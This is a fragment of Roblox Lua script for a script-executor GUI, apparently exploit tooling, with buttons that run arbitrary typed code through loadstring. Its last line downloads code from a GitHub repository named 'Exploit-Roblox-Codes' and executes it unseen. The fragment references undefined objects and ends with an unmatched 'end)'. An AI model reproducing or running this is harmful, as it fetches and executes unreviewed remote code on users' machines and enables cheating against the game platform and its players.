local openButton = Instance.new("TextButton")
openButton.Size = UDim2.new(0, 100, 0, 30)
openButton.Position = UDim2.new(0, 0, 0, 0)
openButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
openButton.Text = "Open"
openButton.TextColor3 = Color3.fromRGB(0, 0, 0)
openButton.Font = Enum.Font.SourceSans
openButton.TextSize = 20
openButton.Visible = false
openButton.Parent = screenGui

executeButton.MouseButton1Click:Connect(function()
    local luaCode = textBox.Text
    if luaCode ~= "" then
        local success, err = pcall(function()
            loadstring(luaCode)()
        end)
        if not success then
            warn("Error executing script: " .. err)
        end
    else
        print("No Lua code entered!")
    end
end)

clearButton.MouseButton1Click:Connect(function()
    textBox.Text = ""
    print("Cleared TextBox!")
end)

closeButton.MouseButton1Click:Connect(function()
    frame.Visible = false
    openButton.Visible = true
end)

openButton.MouseButton1Click:Connect(function()
    frame.Visible = true
    openButton.Visible = false
end)

deleteButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
    print("GUI Deleted!")
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox55Coder/Exploit-Roblox-Codes/refs/heads/main/requirenotrequirelol"))()
end)

